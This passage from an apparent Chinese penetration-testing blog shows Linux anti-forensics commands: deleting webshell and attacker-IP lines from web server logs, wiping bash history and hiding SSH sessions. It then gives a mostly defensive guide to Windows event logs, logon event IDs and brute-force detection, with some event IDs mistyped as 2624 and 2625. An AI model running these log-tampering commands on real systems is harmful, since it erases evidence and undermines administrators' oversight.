class="hljs-regexp">/nginx/</span>access.log<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log | <span class="hljs-keyword">grep</span> -v shell.php &gt; <span class="hljs-regexp">/tmp/</span>a.log<br>cat <span class="hljs-regexp">/tmp/</span>a.log &gt; <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log<br>sed -i -e <span class="hljs-string">&#x27;/shell.php/d&#x27;</span> <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>access.log<br>sed -i -e <span class="hljs-string">&#x27;/123\.123\.123\.123/d&#x27;</span> <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>access.log<br>第一条删除所有包含shell.php这个字符串的行<br>第二条删除包含<span class="hljs-number">123.123</span>.<span class="hljs-number">123.123</span>这个字符串(我们自己的IP)的行.<br><br></code></pre></td></tr></table></figure><p>相关得还有apache 的日志</p><h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><blockquote><p>&#x2F;var&#x2F;log&#x2F;cron：记录了系统定时任务相关的日志</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218231852198.png" alt="image-20240218231852198"></p><h2 id="操作历史记录"><a href="#操作历史记录" class="headerlink" title="操作历史记录"></a>操作历史记录</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">history</span>：显示历史记录<br>~<span class="hljs-string">/.bash_history</span>：历史记录文件<br><br>删除全部历史记录：<span class="hljs-keyword">history</span> –w &amp;&amp; <span class="hljs-keyword">history</span> –c &amp;&amp; &gt; <span class="hljs-string">.bash_history</span><br>删除指定行的历史记录：<span class="hljs-keyword">history</span> -d 111<br>备份还原历史记录：cp <span class="hljs-string">.bash_history</span> his.txt<br>删除100行以后的历史记录：sed -i <span class="hljs-string">&quot;100,$d&quot;</span> <span class="hljs-string">.bash_history</span><br></code></pre></td></tr></table></figure><p>如果是zsh 文件的名字则为 .zsh_history</p><p>如果是其他 就是对应的名字后面添加histroy</p><h1 id="隐藏历史记录"><a href="#隐藏历史记录" class="headerlink" title="隐藏历史记录"></a>隐藏历史记录</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">开启无痕模式，禁用命令历史记录功能。<br><span class="hljs-built_in">set</span> +o <span class="hljs-built_in">history</span><br>恢复<br><span class="hljs-built_in">set</span> -o <span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><h1 id="SSH隐身登录"><a href="#SSH隐身登录" class="headerlink" title="SSH隐身登录"></a>SSH隐身登录</h1><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">ssh -T user@host <span class="hljs-regexp">/bin/</span>bash -i<br>ssh -o UserKnownHostsFile=<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> -T user@host <span class="hljs-regexp">/bin/</span>bash -<span class="hljs-keyword">if</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windwos痕迹清楚</title>
    <link href="/2024/02/18/%E6%B8%97%E9%80%8F/windwos%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4/"/>
    <url>/2024/02/18/%E6%B8%97%E9%80%8F/windwos%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Windows日志"><a href="#Windows日志" class="headerlink" title="Windows日志"></a>Windows日志</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。在渗透测试过程中，Windows日志往往会记录系统上的敏感操作，如添加用户，远程登录，执行命令等。攻击者通常会对Windows日志进行清除和绕过。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="系统日志-System"><a href="#系统日志-System" class="headerlink" title="系统日志(System)"></a>系统日志(System)</h3><p>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows  NT&#x2F;2000操作系统预先定义。  </p><p>默认日志路径： %SystemRoot%\System32\Winevt\Logs\System.evtx</p><h3 id="应用程序日志-Application"><a href="#应用程序日志-Application" class="headerlink" title="应用程序日志(Application)"></a>应用程序日志(Application)</h3><p>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监  视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。  </p><p>默认日志路径：%SystemRoot%\System32\Winevt\Logs\Application.evtx</p><h3 id="安全日志-Security"><a href="#安全日志-Security" class="headerlink" title="安全日志(Security)"></a>安全日志(Security)</h3><p>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中  最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或 者在注册表中设置审核策略，以便当安全性日志满后使系  统停止响应。  </p><p>默认日志路径：%SystemRoot%\System32\Winevt\Logs\Security.evtx  </p><p>系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。  </p><p>安全日志记录着事件审计信息，包括用户验证 （登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。  </p><h2 id="查看系统日志"><a href="#查看系统日志" class="headerlink" title="查看系统日志"></a>查看系统日志</h2><h3 id="事件管理器"><a href="#事件管理器" class="headerlink" title="事件管理器"></a>事件管理器</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165217671.png" alt="image-20240218165217671"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165230450.png" alt="image-20240218165230450"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165303627.png" alt="image-20240218165303627"></p><p>注意不同的操作系统可能名字可能不同</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165343460.png" alt="image-20240218165343460"></p><p>可以直接搜搜</p><p>说着直接使用win+r</p><p>eventvwr.msc</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165853073.png" alt="image-20240218165853073"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218175006030.png" alt="image-20240218175006030"></p><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 查看所有日志</span><br>powershell <span class="hljs-literal">-c</span> <span class="hljs-built_in">Get-winEvent</span><br><br><span class="hljs-comment"># 查看应用程序类别下的日志</span><br>powershell <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;Get-WinEvent -FilterHashtable @&#123;logname=&#x27;Application&#x27;;&#125;&quot;</span><br><br></code></pre></td></tr></table></figure><h2 id="保存地址"><a href="#保存地址" class="headerlink" title="保存地址"></a>保存地址</h2><blockquote><p>C:\Windows\System32\winevt\Logs\  </p><p>%systemroot%\System32\winevt\Logs\   </p></blockquote><h2 id="审核策略与事件查看器"><a href="#审核策略与事件查看器" class="headerlink" title="审核策略与事件查看器"></a>审核策略与事件查看器</h2><blockquote><p>基本安全审核策略设置：<a href="https://learn.microsoft.com/zh-cn/windows/security/threat-protection/auditing/basic-security-audit-policy-settings">https://learn.microsoft.com/zh-cn/windows/security/threat-protection/auditing/basic-security-audit-policy-settings</a></p></blockquote><blockquote><p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p></blockquote><blockquote><p>默认状态下，也会记录一些简单的日志，日志默认大小20M 设置</p></blockquote><p>添加其他安全设置</p><p>  设置1：Win+R 输入 secpol.msc 打开本地安全策略 → 本地策略 → 审核策略，参考配置操作：  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218171723592.png" alt="image-20240218171723592"></p><blockquote><p>问题：设置完审核策略后，执行 gpupdate  &#x2F;force，更新组策略，导致策略自动消失。  </p><p>解决方法：删除 C:\Windows\System32\GroupPolicy\Machine\Microsoft\Windows NT\Audit\ 文件夹下的.csv文件，即可</p></blockquote><p>发现没有这个就直接执行</p><p>设置2：Win+R，输入 eventvwr.msc 进入事件查看器，设置合理的日志属性，即日志最大大小、事件覆盖阀值等：  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218172124035.png" alt="image-20240218172124035"></p><p>常见登录事件日志分析  </p><p>对于Windows事件日志分析，不同的EVENT  ID代表了不同的意义，摘录一些常见的安全事件的说明：  </p><table><thead><tr><th>事件id</th><th>说明</th></tr></thead><tbody><tr><td>4624</td><td>登录成功</td></tr><tr><td>4625</td><td>登录失败</td></tr><tr><td>4634</td><td>注销成功</td></tr><tr><td>4647</td><td>用户自动的注销</td></tr><tr><td>4672</td><td>使用超级用户登录（管理员）</td></tr><tr><td>4720</td><td>创建用户</td></tr></tbody></table><p>登录类型  </p><blockquote><p>  每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：  </p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218173742234.png" alt="image-20240218173742234"></p><h3 id="本地交互式登录"><a href="#本地交互式登录" class="headerlink" title="本地交互式登录"></a>本地交互式登录</h3><p>这种方式就是最普通的登陆方式</p><ol><li><p>4648-4624-登录成功</p><p> 首先是成功的登录，从日志分析来看至少会有2个事件发生，ID分别为 4648、4624，以下从上至下分别是各自的截图。</p></li></ol><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218174226310.png" alt="image-20240218174226310"></p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218174250490.png" alt="image-20240218174250490"></p><p>   首先是 ID 4648 事件，该事件说明有人使用身份凭据在尝试登录，并且头字段中的用户名为SYSTEM，看看描述信息中有什么：  </p><blockquote><p>试图使用显式凭据登录。</p><p>主题:<br>    安全 ID:  SYSTEM<br>    帐户名:        PC$<br>    帐户域:        WORKGRUOP<br>    登录 ID:  0x3e7<br>    登录 GUID:    {00000000-0000-0000-0000-000000000000}</p><p>使用了哪个帐户的凭据:<br>    帐户名:        Administrator<br>    帐户域:        PC<br>    登录 GUID:    {00000000-0000-0000-0000-000000000000}</p><p>目标服务器:<br>    目标服务器名:localhost<br>    附加信息:   localhost</p><p>进程信息:<br>    进程 ID:  0x630<br>    进程名:        C:\Windows\System32\winlogon.exe</p><p>网络信息:<br>    网络地址:   127.0.0.1<br>    端口:     0</p><p>在进程尝试通过显式指定帐户的凭据来登录该帐户时生成此事件。这通常发生在批量类型的配置中(例如计划任务) 或者使用 RUNAS 命令时。</p></blockquote><blockquote><p>日志名称:        Security<br>来源:            Microsoft-Windows-Security-Auditing<br>日期:            2022&#x2F;9&#x2F;29 14:43:18<br>事件 ID:         4648<br>任务类别:        登录<br>级别:            信息<br>关键字:          审核成功<br>用户:            暂缺<br>计算机:          PC （目标机器名）</p></blockquote><p>   然后是4624 事件， 查看描述信息</p><blockquote><p>已成功登录帐户。</p><p>主题:<br>    安全 ID:  SYSTEM<br>    帐户名:        PC$<br>    帐户域:        WORKGRUOP<br>    登录 ID:  0x3e7</p><p>登录类型:        2</p><p>新登录:<br>    安全 ID:  PC\Administrator<br>    帐户名:        Administrator<br>    帐户域:        PC<br>    登录 ID:  0x252938<br>    登录 GUID:    {00000000-0000-0000-0000-000000000000}</p><p>进程信息:<br>    进程 ID:  0x630<br>    进程名:        C:\Windows\System32\winlogon.exe</p><p>网络信息:<br>    工作站名:   PC<br>    源网络地址:  127.0.0.1<br>    源端口:        0</p><p>详细身份验证信息:<br>    登录进程:       User32<br>    身份验证数据包:    Negotiate<br>    传递服务:   -<br>    数据包名(仅限 NTLM):  -<br>    密钥长度:       0</p><p>在创建登录会话后在被访问的计算机上生成此事件。</p><p>“主题”字段指明本地系统上请求登录的帐户。这通常是一个服务(例如 Server 服务)或本地进程(例如 Winlogon.exe 或 Services.exe)。</p><p>“登录类型”字段指明发生的登录种类。最常见的类型是 2 (交互式)和 3 (网络)。</p><p>“新登录”字段会指明新登录是为哪个帐户创建的，即登录的帐户。</p><p>“网络”字段指明远程登录请求来自哪里。“工作站名”并非总是可用，而且在某些情况下可能会留为空白。</p><p>“身份验证信息”字段提供关于此特定登录请求的详细信息。<br>    -“登录 GUID”是可以用于将此事件与一个 KDC 事件关联起来的唯一标识符。<br>    -“传递服务”指明哪些直接服务参与了此登录请求。<br>    - “数据包名”指明在 NTLM 协议之间使用了哪些子协议。<br>        -“密钥长度”指明生成的会话密钥的长度。如果没有请求会话密钥则此字段为 0。</p></blockquote><blockquote><p>日志名称:        Security<br>来源:            Microsoft-Windows-Security-Auditing<br>日期:            2022&#x2F;9&#x2F;29 14:43:18<br>事件 ID:         4624<br>任务类别:        登录<br>级别:            信息<br>关键字:          审核成功<br>用户:            暂缺<br>计算机:          PC</p></blockquote><ol start="2"><li><p>如果是登录失败</p><p>可以查看到对应的出错的原因</p><blockquote><p>帐户登录失败。</p><p>主题:<br>    安全 ID:  SYSTEM<br>    帐户名:        PC$<br>    帐户域:        WORKGRUOP<br>    登录 ID:  0x3e7</p><p>登录类型:        2</p><p>登录失败的帐户:<br>    安全 ID:  NULL SID<br>    帐户名:        Administrator<br>    帐户域:        PC</p><p>失败信息:<br>    失败原因:   未知用户名或密码错误。<br>    状态:     0xc000006d<br>    子状态:        0xc000006a</p><p>进程信息:<br>    调用方进程 ID:   0x630<br>    调用方进程名: C:\Windows\System32\winlogon.exe</p><p>网络信息:<br>    工作站名:   PC<br>    源网络地址:  127.0.0.1<br>    源端口:        0</p><p>详细身份验证信息:<br>    登录进程:       User32<br>    身份验证数据包:    Negotiate<br>    传递服务:   -<br>    数据包名(仅限 NTLM):  -<br>    密钥长度:       0</p><p>登录请求失败时在尝试访问的计算机上生成此事件。</p></blockquote><blockquote><p>日志名称:        Security<br>来源:            Microsoft-Windows-Security-Auditing<br>日期:            2022&#x2F;9&#x2F;29 14:43:15<br>事件 ID:         4625<br>任务类别:        登录<br>级别:            信息<br>关键字:          审核失败<br>用户:            暂缺<br>计算机:          PC</p></blockquote></li></ol><h3 id="RDP协议远程登录"><a href="#RDP协议远程登录" class="headerlink" title="RDP协议远程登录"></a>RDP协议远程登录</h3><ol><li><p>4648-4624-4672-登录成功</p><p>  使用mstsc远程登录某个主机时，使用的帐户是管理员帐户的话，成功的情况下会有ID为4648、4624、4672的事件产生。  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218181810533.png" alt="image-20240218181810533"></p><p>10 代表了交互性</p></li><li><p>4625-登录失败</p></li></ol><p>   登录事件 ID为 4625  </p><p>   登录类型为 10（远程交互）</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218181903437.png" alt="image-20240218181903437"></p><h3 id="连接共享文件夹"><a href="#连接共享文件夹" class="headerlink" title="连接共享文件夹"></a>连接共享文件夹</h3><p>远程访问某台主机的共享资源，如某个共享文件夹  </p><ol><li>2624-登录成功</li></ol><blockquote><p>使用正确的用户名和密码访问远程共享主机，登录事件ID为4624，登录类型为3（Network），审核成功。列出了源网络地址端口。  </p></blockquote>   <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">81.169</span>\c<span class="hljs-variable">$ </span>/<span class="hljs-symbol">user:</span>administrator<br></code></pre></td></tr></table></figure><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218182112022.png" alt="image-20240218182112022"></p><p>   如果访问共享资源使用的帐户名、密码正确，但是该用户对指定的共享文件夹没有访问权限时仍然会有ID为4624的认证成功事件生。  </p><ol start="2"><li>2625-登录失败</li></ol><blockquote><p>  登录失败 事件ID 4625  登录类型 3  </p><p>  同RDP协议远程登录一样，使用不存在的用户名和错误密码分别登录失败，ID为4625，登录类型为3（网络）。审核失败，列出了登录失败的账户名和失败原因。  </p></blockquote><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218182258620.png" alt="image-20240218182258620"></p><h3 id="RUNAS登录"><a href="#RUNAS登录" class="headerlink" title="RUNAS登录"></a>RUNAS登录</h3><p>登录成功 事件ID 2624  </p><p>登录类型 9  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218182343396.png" alt="image-20240218182343396"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><blockquote><p>在进程尝试通过显式指定帐户的凭据来登录该帐户时生成4648事件。  </p><p>成功的登录通常会有4624事件产生，在创建登录会话后在被访问的计算机上生成此事件。  </p><p>如果用户有特权会有4672事件产生。  </p><p>通常情况下只需关注登录类型为2、3、9、10类型的4625登录失败事件。  </p></blockquote><h2 id="登录爆破是咧"><a href="#登录爆破是咧" class="headerlink" title="登录爆破是咧"></a>登录爆破是咧</h2><blockquote><p>4624  –登录成功<br>4625  –登录失败<br>4634  – 注销成功<br>4647  – 用户启动的注销<br>4672  – 使用超级用户（如管理员）进行登录  </p></blockquote><ol><li>Win+R 输入 eventvwr.msc，打开事件管理器  </li><li>Windows日志 -&gt; 安全 -&gt; 筛选当前日志  </li><li>输入事件ID：4625 ，进行日志筛选  </li><li>发现事件ID：4625，事件数8153，即用户登录失败了8153次，那么这台服务器管理员账号可能遭遇了暴力猜解。</li></ol><p>  也可通过手动编辑XML过滤进行筛选：  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">QueryList</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Query</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">Path</span>=<span class="hljs-string">&quot;Security&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Select</span> <span class="hljs-attr">Path</span>=<span class="hljs-string">&quot;Security&quot;</span>&gt;</span>*[System[EventID=4625]] and *[EventData[Data[@Name=&#x27;IpAddress&#x27;]=&#x27;192.168.81.134&#x27;]]<span class="hljs-tag">&lt;/<span class="hljs-name">Select</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">Query</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">QueryList</span>&gt;</span><br></code></pre></td></tr></table></figure><p>接下来就来分析一下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218204413020.png" alt="image-20240218204413020"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218204628447.png" alt="image-20240218204628447"></p><p>发现 事件4625 的比例很大，猜测可能该主机被爆破</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218205534552.png" alt="image-20240218205534552"></p><p>可以发现攻击者的Ip</p><h1 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h1><h2 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h2><blockquote><p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统  </p><p>的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p></blockquote><p>用法</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218210839642.png" alt="image-20240218210839642"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">C:</span>\&gt;<span class="hljs-title class_">LogParser</span>.exe<br><br><span class="hljs-title class_">Microsoft</span>（R）<span class="hljs-title class_">Log</span> <span class="hljs-title class_">Parser</span> <span class="hljs-number">2.2</span>.<span class="hljs-number">10</span>版<br><br>用法:   <br><br> <span class="hljs-title class_">LogParser</span> [-<span class="hljs-symbol">i:</span>&lt;input_format&gt;] [-<span class="hljs-symbol">o:</span>&lt;output_format&gt;] &lt;<span class="hljs-title class_">SQL</span> query&gt; |<br>           <span class="hljs-symbol">file:</span>&lt;query_filename&gt;[?param1=value1+...]<br>           [&lt;input_format_options&gt;] [&lt;output_format_options&gt;]<br>           [-q[<span class="hljs-symbol">:ON|OFF</span>]] [-<span class="hljs-symbol">e:</span>&lt;max_errors&gt;] [-iw[<span class="hljs-symbol">:ON|OFF</span>]]<br>           [-stats[<span class="hljs-symbol">:ON|OFF</span>]] [-saveDefaults] [-queryInfo]<br><br> <span class="hljs-title class_">LogParser</span> -c -<span class="hljs-symbol">i:</span>&lt;input_format&gt; -<span class="hljs-symbol">o:</span>&lt;output_format&gt; &lt;from_entity&gt;<br>           &lt;into_entity&gt; [&lt;where_clause&gt;] [&lt;input_format_options&gt;]<br>           [&lt;output_format_options&gt;] [-multiSite[<span class="hljs-symbol">:ON|OFF</span>]]<br>           [-q[<span class="hljs-symbol">:ON|OFF</span>]] [-<span class="hljs-symbol">e:</span>&lt;max_errors&gt;] [-iw[<span class="hljs-symbol">:ON|OFF</span>]]<br>           [-stats[<span class="hljs-symbol">:ON|OFF</span>]] [-queryInfo]<br><br> -<span class="hljs-symbol">i:</span>&lt;input_format&gt;   :  <span class="hljs-title class_">IISW3C</span>, <span class="hljs-title class_">NCSA</span>, <span class="hljs-title class_">IIS</span>, <span class="hljs-title class_">IISODBC</span>, <span class="hljs-title class_">BIN</span>, <span class="hljs-title class_">IISMSID</span>, <span class="hljs-title class_">HTTPERR</span>, <span class="hljs-title class_">URLSCAN</span>, <span class="hljs-title class_">CSV</span>, <span class="hljs-title class_">TSV</span>, <span class="hljs-title class_">W3C</span>, <span class="hljs-title class_">XML</span>, <br>                        <span class="hljs-title class_">EVT</span>, <span class="hljs-title class_">ETW</span>, <span class="hljs-title class_">NETMON</span>, <span class="hljs-title class_">REG</span>, <span class="hljs-title class_">ADS</span>, <span class="hljs-title class_">TEXTLINE</span>, <span class="hljs-title class_">TEXTWORD</span>, <span class="hljs-title class_">FS</span>, <span class="hljs-title class_">COM</span> <br>                        (指定其中一个，如果省略，将从from子句猜测)<br> -<span class="hljs-symbol">o:</span>&lt;output_format&gt;  :  <span class="hljs-title class_">CSV</span>, <span class="hljs-title class_">TSV</span>, <span class="hljs-title class_">XML</span>, <span class="hljs-title class_">DATAGRID</span>, <span class="hljs-title class_">CHART</span>, <span class="hljs-title class_">SYSLOG</span>, <span class="hljs-title class_">NEUROVIEW</span>, <span class="hljs-title class_">NAT</span>, <span class="hljs-title class_">W3C</span>, <span class="hljs-title class_">IIS</span>, <span class="hljs-title class_">SQL</span>, <span class="hljs-title class_">TPL</span>, <span class="hljs-title class_">NULL</span> <br>                         (指定其中一个，如果省略，将从from子句猜测)<br> -q[<span class="hljs-symbol">:ON|OFF</span>]         :  安静模式；默认值为<span class="hljs-title class_">OFF</span><br> -<span class="hljs-symbol">e:</span>&lt;max_errors&gt;     :  中止前的最大解析错误数；默认值为<span class="hljs-number">-1</span> (全部忽略)<br> -iw[<span class="hljs-symbol">:ON|OFF</span>]        :  忽略警告；默认值为<span class="hljs-title class_">OFF</span><br> -stats[<span class="hljs-symbol">:ON|OFF</span>]     :  执行查询后显示统计信息；默认值为<span class="hljs-title class_">ON</span><br> -c                  :  使用内置转换查询<br> -multiSite[<span class="hljs-symbol">:ON|OFF</span>] :  根据 <span class="hljs-title class_">SiteID</span> 值将 <span class="hljs-title class_">BIN</span> 转换输出发送到多个文件；默认值为<span class="hljs-title class_">OFF</span><br> -saveDefaults       :  将指定的选项保存为默认值<br> -restoreDefaults    :  恢复出厂默认值<br> -queryInfo          :  显示查询处理信息（不执行查询）<br><br><span class="hljs-symbol">Examples:</span><br> <span class="hljs-title class_">LogParser</span> <span class="hljs-string">&quot;SELECT date, REVERSEDNS(c-ip) AS Client, COUNT(*) FROM file.log WHERE sc-status&lt;&gt;200 GROUP BY date, Client&quot;</span> -<span class="hljs-symbol">e:</span><span class="hljs-number">10</span><br><br> <span class="hljs-title class_">LogParser</span> <span class="hljs-symbol">file:</span>myQuery.sql?myInput=<span class="hljs-symbol">C:</span>\temp\ex*.log+myOutput=results.csv<br><br> <span class="hljs-title class_">LogParser</span> -c -<span class="hljs-symbol">i:</span><span class="hljs-title class_">BIN</span> -<span class="hljs-symbol">o:</span><span class="hljs-title class_">W3C</span> file1.log file2.log <span class="hljs-string">&quot;ComputerName IS NOT NULL&quot;</span><br><br><span class="hljs-symbol">Help:</span><br> -h <span class="hljs-title class_">GRAMMAR</span>                  : <span class="hljs-title class_">SQL</span>语言语法<br> -h <span class="hljs-title class_">FUNCTIONS</span> [ &lt;function&gt; ] : 函数语法<br> -h <span class="hljs-title class_">EXAMPLES</span>                 : 查询和命令示例<br> -h -<span class="hljs-symbol">i:</span>&lt;input_format&gt;        : 有关 &lt;input_format&gt; 的帮助<br> -h -<span class="hljs-symbol">o:</span>&lt;output_format&gt;       : 有关 &lt;output_format&gt; 的帮助<br> -h -c                       : <span class="hljs-title class_">Conversion</span> help<br></code></pre></td></tr></table></figure><p>查看事件id为4624 的事件</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 